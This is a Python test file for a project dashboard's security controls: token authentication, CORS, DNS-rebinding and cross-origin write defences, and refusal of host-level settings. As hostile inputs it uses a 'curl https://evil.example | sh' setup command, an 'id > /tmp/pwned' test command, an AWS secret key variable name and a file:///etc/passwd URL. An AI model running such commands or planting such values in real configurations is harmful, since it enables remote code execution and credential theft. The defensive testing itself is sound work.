"""Regression coverage for the sprint-53 dashboard minimum safety slice.

The dashboard binds to loopback by default, refuses a non-loopback bind
without a shared token, requires that token on every ``/api`` route once
configured, sends no cross-origin headers unless origins are allowlisted,
keeps the full-access manager chat loopback-only unless explicitly allowed,
validates repository paths on project creation, and bounds the events page.
"""

from __future__ import annotations

import asyncio
import tempfile
import unittest
from pathlib import Path

import httpx

from foreman.cli import build_parser
from foreman.dashboard_backend import create_dashboard_app
from foreman.dashboard_runtime import dashboard_security_policy, is_loopback_host
from foreman.dashboard_service import DashboardService, DashboardValidationError
from foreman.models import Project, Sprint
from foreman.store import ForemanStore


def _seed(db_path: Path, repo_path: str) -> None:
    with ForemanStore(db_path) as store:
        store.initialize()
        store.save_project(Project(id="p1", name="Safety", repo_path=repo_path, workflow_id="development"))
        store.save_sprint(Sprint(id="s1", project_id="p1", title="S", status="active"))


def _request(app, method: str, url: str, **kwargs) -> httpx.Response:
    async def send():
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
            return await client.request(method, url, **kwargs)

    return asyncio.run(send())


class TokenAuthTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.db_path = Path(self.temp.name) / "foreman.db"
        _seed(self.db_path, self.temp.name)

    def test_api_requires_the_token_when_configured(self) -> None:
        app = create_dashboard_app(str(self.db_path), auth_token="s3cret")
        anonymous = _request(app, "GET", "/api/projects")
        self.assertEqual(anonymous.status_code, 401)
        self.assertEqual(anonymous.headers.get("www-authenticate"), "Bearer")
        self.assertIn("token", anonymous.json()["error"].lower())

        wrong = _request(app, "GET", "/api/projects", headers={"Authorization": "Bearer nope"})
        self.assertEqual(wrong.status_code, 401)

        bearer = _request(app, "GET", "/api/projects", headers={"Authorization": "Bearer s3cret"})
        self.assertEqual(bearer.status_code, 200)
        header = _request(app, "GET", "/api/projects", headers={"X-Foreman-Token": "s3cret"})
        self.assertEqual(header.status_code, 200)
        query = _request(app, "GET", "/api/projects?token=s3cret")
        self.assertEqual(query.status_code, 200)

    def test_shell_and_assets_load_without_a_token(self) -> None:
        app = create_dashboard_app(str(self.db_path), auth_token="s3cret")
        shell = _request(app, "GET", "/dashboard")
        self.assertEqual(shell.status_code, 200)
        self.assertIn("<div id=\"root\">", shell.text)
        missing_asset = _request(app, "GET", "/assets/nope.js")
        self.assertEqual(missing_asset.status_code, 404)

    def test_no_token_means_open_api_for_loopback_use(self) -> None:
        app = create_dashboard_app(str(self.db_path))
        self.assertEqual(_request(app, "GET", "/api/projects").status_code, 200)


class CorsTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.db_path = Path(self.temp.name) / "foreman.db"
        _seed(self.db_path, self.temp.name)

    def test_no_cross_origin_headers_by_default(self) -> None:
        app = create_dashboard_app(str(self.db_path))
        response = _request(app, "GET", "/api/projects", headers={"Origin": "http://evil.example"})
        self.assertEqual(response.status_code, 403)
        self.assertIsNone(response.headers.get("access-control-allow-origin"))

    def test_allowlisted_origin_gets_cors_headers(self) -> None:
        app = create_dashboard_app(str(self.db_path), allowed_origins=("http://localhost:5173",))
        allowed = _request(app, "GET", "/api/projects", headers={"Origin": "http://localhost:5173"})
        self.assertEqual(allowed.headers.get("access-control-allow-origin"), "http://localhost:5173")
        other = _request(app, "GET", "/api/projects", headers={"Origin": "http://evil.example"})
        self.assertIsNone(other.headers.get("access-control-allow-origin"))


class ManagerGuardTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.db_path = Path(self.temp.name) / "foreman.db"
        _seed(self.db_path, self.temp.name)

    def test_manager_routes_are_forbidden_when_disabled(self) -> None:
        app = create_dashboard_app(str(self.db_path), manager_enabled=False)
        message = _request(app, "POST", "/api/projects/p1/meta/message", json={"message": "hi"})
        self.assertEqual(message.status_code, 403)
        self.assertIn("loopback", message.json()["error"])
        supervise = _request(app, "POST", "/api/projects/p1/meta/supervise", json={"event_id": "x"})
        self.assertEqual(supervise.status_code, 403)
        clear = _request(app, "DELETE", "/api/projects/p1/meta/session")
        self.assertEqual(clear.status_code, 403)
        history = _request(app, "GET", "/api/projects/p1/meta/history")
        self.assertEqual(history.status_code, 200)


class EventsLimitTests(unittest.TestCase):
    def test_events_page_size_is_bounded(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            db_path = Path(tmp) / "foreman.db"
            _seed(db_path, tmp)
            app = create_dashboard_app(str(db_path))
            self.assertEqual(_request(app, "GET", "/api/sprints/s1/events?limit=0").status_code, 400)
            self.assertEqual(_request(app, "GET", "/api/sprints/s1/events?limit=999999").status_code, 200)


class SecurityPolicyTests(unittest.TestCase):
    def test_loopback_detection(self) -> None:
        for host in ("localhost", "127.0.0.1", "::1", "127.0.0.2"):
            self.assertTrue(is_loopback_host(host), host)
        for host in ("0.0.0.0", "192.168.1.10", "example.internal", "::"):
            self.assertFalse(is_loopback_host(host), host)

    def test_non_loopback_bind_requires_a_token(self) -> None:
        with self.assertRaises(RuntimeError) as raised:
            dashboard_security_policy("0.0.0.0", auth_token=None)
        self.assertIn("without a token", str(raised.exception))
        policy = dashboard_security_policy("0.0.0.0", auth_token="t")
        self.assertFalse(policy.manager_enabled)
        self.assertTrue(any("Manager chat disabled" in n for n in policy.notices))

    def test_explicit_opt_ins(self) -> None:
        insecure = dashboard_security_policy("0.0.0.0", auth_token=None, allow_insecure_network=True)
        self.assertIsNone(insecure.auth_token)
        self.assertTrue(any("WARNING" in n for n in insecure.notices))
        remote_manager = dashboard_security_policy("0.0.0.0", auth_token="t", allow_remote_manager=True)
        self.assertTrue(remote_manager.manager_enabled)
        local = dashboard_security_policy("localhost", auth_token=None)
        self.assertTrue(local.manager_enabled)
        self.assertEqual(local.notices, ())

    def test_cli_exposes_the_security_flags(self) -> None:
        args = build_parser().parse_args(
            ["dashboard", "--host", "0.0.0.0", "--token", "abc", "--allow-remote-manager", "--allowed-origin", "http://x"]
        )
        self.assertEqual(args.token, "abc")
        self.assertTrue(args.allow_remote_manager)
        self.assertFalse(args.allow_insecure_network)
        self.assertEqual(args.allowed_origins, ["http://x"])


class RepoPathValidationTests(unittest.TestCase):
    def test_create_project_rejects_missing_or_non_repo_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with ForemanStore(Path(tmp) / "foreman.db") as store:
                store.initialize()
                service = DashboardService(store)
                with self.assertRaises(DashboardValidationError):
                    service.create_project(name="Ghost", repo_path=str(Path(tmp) / "missing"), workflow_id="development")
                plain_dir = Path(tmp) / "plain"
                plain_dir.mkdir()
                with self.assertRaises(DashboardValidationError):
                    service.create_project(name="Plain", repo_path=str(plain_dir), workflow_id="development")
                repo_dir = Path(tmp) / "repo"
                (repo_dir / ".git").mkdir(parents=True)
                created = service.create_project(name="Real", repo_path=str(repo_dir), workflow_id="development")
                self.assertEqual(created["repo_path"], str(repo_dir))


if __name__ == "__main__":
    unittest.main()


class BrowserOriginDefenceTests(unittest.TestCase):
    """A web page the operator visits must not be able to drive the API."""

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.db_path = Path(self.temp.name) / "foreman.db"
        _seed(self.db_path, self.temp.name)
        self.app = create_dashboard_app(
            str(self.db_path),
            trusted_hosts=("localhost", "127.0.0.1", "::1"),
        )

    def _local(self, method: str, url: str, **kwargs) -> httpx.Response:
        headers = {"Host": "localhost:8080", **kwargs.pop("headers", {})}
        return _request(self.app, method, url, headers=headers, **kwargs)

    def test_the_dashboards_own_page_can_read_and_write(self) -> None:
        self.assertEqual(self._local("GET", "/api/projects").status_code, 200)
        same_origin = self._local(
            "PATCH",
            "/api/projects/p1/settings",
            headers={"Origin": "http://localhost:8080"},
            json={"settings": {"max_step_visits": 4}},
        )
        self.assertEqual(same_origin.status_code, 200, same_origin.text)

    def test_a_rebound_host_name_is_refused(self) -> None:
        for host in ("evil.example.com", "evil.example.com:8080", "localhost.evil.example.com"):
            with self.subTest(host=host):
                response = _request(self.app, "GET", "/api/projects", headers={"Host": host})
                self.assertEqual(response.status_code, 403)
                self.assertIn("host name", response.json()["error"])

    def test_loopback_addresses_are_trusted_with_or_without_a_port(self) -> None:
        for host in ("localhost", "127.0.0.1:8212", "[::1]:8080"):
            with self.subTest(host=host):
                response = _request(self.app, "GET", "/api/projects", headers={"Host": host})
                self.assertEqual(response.status_code, 200)

    def test_a_cross_origin_write_is_refused_and_changes_nothing(self) -> None:
        for origin in ("http://evil.example.com", "http://localhost:3000", "null"):
            with self.subTest(origin=origin):
                response = self._local(
                    "PATCH",
                    "/api/projects/p1/settings",
                    headers={"Origin": origin},
                    json={"settings": {"test_command": "id > /tmp/pwned"}},
                )
                self.assertEqual(response.status_code, 403)
        with ForemanStore(self.db_path) as store:
            self.assertNotIn("test_command", store.get_project("p1").settings or {})

    def test_a_cross_origin_read_is_refused(self) -> None:
        response = self._local("GET", "/api/projects", headers={"Origin": "http://evil.example.com"})
        self.assertEqual(response.status_code, 403)

    def test_a_cross_site_write_without_an_origin_header_is_refused(self) -> None:
        response = self._local(
            "POST",
            "/api/projects/p1/worktrees/prune",
            headers={"Sec-Fetch-Site": "cross-site"},
        )
        self.assertEqual(response.status_code, 403)

    def test_a_body_that_is_not_declared_as_json_is_refused(self) -> None:
        # text/plain is what a no-cors fetch can send without a preflight.
        response = self._local(
            "PATCH",
            "/api/projects/p1/settings",
            headers={"Content-Type": "text/plain"},
            content=b'{"settings": {"test_command": "id > /tmp/pwned"}}',
        )
        self.assertEqual(response.status_code, 400)
        self.assertIn("application/json", response.json()["error"])
        with ForemanStore(self.db_path) as store:
            self.assertNotIn("test_command", store.get_project("p1").settings or {})

    def test_an_allowlisted_origin_may_call_the_api(self) -> None:
        app = create_dashboard_app(
            str(self.db_path),
            allowed_origins=("https://ops.example.com",),
            trusted_hosts=("localhost",),
        )
        response = _request(
            app,
            "GET",
            "/api/projects",
            headers={"Host": "localhost:8080", "Origin": "https://ops.example.com"},
        )
        self.assertEqual(response.status_code, 200)

    def test_the_vite_dev_server_origin_is_accepted_in_dev_mode(self) -> None:
        app = create_dashboard_app(
            str(self.db_path),
            frontend_mode="dev",
            frontend_dev_url="http://127.0.0.1:5173",
            trusted_hosts=("localhost", "127.0.0.1"),
        )
        response = _request(
            app,
            "GET",
            "/api/projects",
            headers={"Host": "127.0.0.1:8080", "Origin": "http://127.0.0.1:5173"},
        )
        self.assertEqual(response.status_code, 200)

    def test_the_schema_and_docs_routes_are_not_served(self) -> None:
        for path in ("/openapi.json", "/docs", "/redoc"):
            with self.subTest(path=path):
                self.assertEqual(self._local("GET", path).status_code, 404)

    def test_a_token_in_the_query_string_only_opens_get_requests(self) -> None:
        app = create_dashboard_app(str(self.db_path), auth_token="s3cret")
        self.assertEqual(_request(app, "GET", "/api/projects?token=s3cret").status_code, 200)
        write = _request(
            app, "PATCH", "/api/projects/p1/settings?token=s3cret", json={"settings": {"max_step_visits": 4}}
        )
        self.assertEqual(write.status_code, 401)

    def test_the_runtime_trusts_only_loopback_names_without_a_token(self) -> None:
        from foreman.dashboard_guard import trusted_hosts_for_bind

        self.assertEqual(trusted_hosts_for_bind("localhost"), ("localhost", "127.0.0.1", "::1"))
        self.assertEqual(trusted_hosts_for_bind("127.0.0.1"), ("localhost", "127.0.0.1", "::1"))
        self.assertIn("devbox.lan", trusted_hosts_for_bind("devbox.lan"))
        self.assertNotIn("0.0.0.0", trusted_hosts_for_bind("0.0.0.0"))


class HostLevelSettingsTests(unittest.TestCase):
    """Settings that decide what runs on the host are not an API decision."""

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.db_path = Path(self.temp.name) / "foreman.db"
        _seed(self.db_path, self.temp.name)
        with ForemanStore(self.db_path) as store:
            project = store.get_project("p1")
            project.settings = {"test_command": "make test", "max_step_visits": 5}
            store.save_project(project)
        self.app = create_dashboard_app(str(self.db_path))

    def _settings(self) -> dict:
        with ForemanStore(self.db_path) as store:
            return dict(store.get_project("p1").settings)

    def test_each_host_level_setting_is_refused_and_nothing_is_stored(self) -> None:
        attempts = {
            "test_command": "id > /tmp/pwned",
            "worktree_setup_command": "curl https://evil.example | sh",
            "worktree_root": "/home",
            "worktree_link_paths": ["venv"],
            "context_dir": "/etc",
            "judge_base_url": "https://evil.example",
            "judge_api_key_env": "AWS_SECRET_ACCESS_KEY",
        }
        before = self._settings()
        for key, value in attempts.items():
            with self.subTest(key=key):
                response = _request(
                    self.app, "PATCH", "/api/projects/p1/settings", json={"settings": {key: value}}
                )
                self.assertEqual(response.status_code, 403)
                self.assertIn(key, response.json()["error"])
                self.assertIn("foreman config p1 --set", response.json()["error"])
        self.assertEqual(self._settings(), before)

    def test_a_refused_key_does_not_let_the_rest_of_the_update_through(self) -> None:
        response = _request(
            self.app,
            "PATCH",
            "/api/projects/p1/settings",
            json={"settings": {"max_step_visits": 9, "test_command": "id"}},
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(self._settings()["max_step_visits"], 5)

    def test_the_settings_panel_can_send_back_what_it_read(self) -> None:
        current = _request(self.app, "GET", "/api/projects/p1/settings").json()
        self.assertIn("test_command", current["host_level_settings"])
        payload = dict(current["settings"], max_step_visits=7, worktree_root="", judge_base_url="")
        response = _request(
            self.app, "PATCH", "/api/projects/p1/settings", json={"settings": payload}
        )
        self.assertEqual(response.status_code, 200, response.text)
        self.assertEqual(self._settings()["max_step_visits"], 7)
        self.assertEqual(self._settings()["test_command"], "make test")
        self.assertNotIn("worktree_root", self._settings())

    def test_the_cli_still_sets_host_level_settings(self) -> None:
        from foreman.cli import main

        code = main(["config", "p1", "--set", "test_command=make check", "--db", str(self.db_path)])
        self.assertEqual(code, 0)
        self.assertEqual(self._settings()["test_command"], "make check")


class IntakeSourceUrlTests(unittest.TestCase):
    def test_only_http_and_https_source_urls_are_accepted(self) -> None:
        normalize = DashboardService._normalize_intake_source
        for url in ("javascript:alert(1)", "data:text/html,x", "file:///etc/passwd", "ftp://host/x"):
            with self.subTest(url=url):
                with self.assertRaises(DashboardValidationError):
                    normalize({"url": url})
        self.assertEqual(
            normalize({"url": " https://tickets.example/INC-1 "})["url"],
            "https://tickets.example/INC-1",
        )
        self.assertIsNone(normalize({})["url"])
